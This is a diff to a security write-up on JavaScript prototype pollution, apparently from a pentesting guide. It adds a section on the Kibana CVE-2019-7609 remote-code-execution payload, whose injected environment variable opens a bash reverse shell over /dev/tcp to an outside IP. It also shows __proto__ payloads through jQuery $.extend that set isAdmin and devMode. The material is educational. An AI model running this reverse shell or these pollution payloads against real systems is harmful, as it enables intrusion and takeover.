@@ -66,7 +66,7 @@ Note that, if you add a property to an object that is used as the prototype for 
 
 So where’s the prototype pollution? It happens when there’s a bug in the application that makes it possible to overwrite properties of `Object.prototype`. Since every typical object inherits its properties from `Object.prototype`, we can change application behavior. The most commonly shown example is the following:
 
-```text
+```javascript
 if (user.isAdmin) {   // do something important!}
 ```
 
@@ -84,6 +84,15 @@ However, the attack is not as simple as the one above, according to [paper](http
 
 Let’s look through some errors:
 
+### CVE-2019-7609
+
+In [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) you can see a way to exploit this vulnerability and obtain a RCE abusing environmental variables:
+
+```javascript
+env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//'
+env.NODE_OPTIONS='--require /proc/self/environ'
+```
+
 ### CVE-2019–11358: Prototype pollution attack through jQuery $ .extend
 
 $ .extend, if handled incorrectly, can change the properties of the object `prototype`\(the template of the objects in the app\). This attribute will then appear on all objects. Note that only the “deep” version \(ie g\) of $ .extened is affected.
@@ -94,7 +103,7 @@ We can imagine `myObject`is an input field from the user and is serialized into 
 
 In this code, we often think, when running will assign the attribute `isAdmin`into the newly created object. But essentially, it is assigned directly to `{}` and then `{}.isAdmin` will be `true`. If after this code, we perform the following check:
 
-```text
+```javascript
 If (user.isAdmin === true) {
     // do something for admin
 }
@@ -104,7 +113,7 @@ If the user has not yet existed \( `undefined`\), the property`isAdmin`will be s
 
 Another example when executed on JQuery 3.3.1:
 
-```text
+```javascript
 $.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
 console.log({}.devMode); // true
 ```
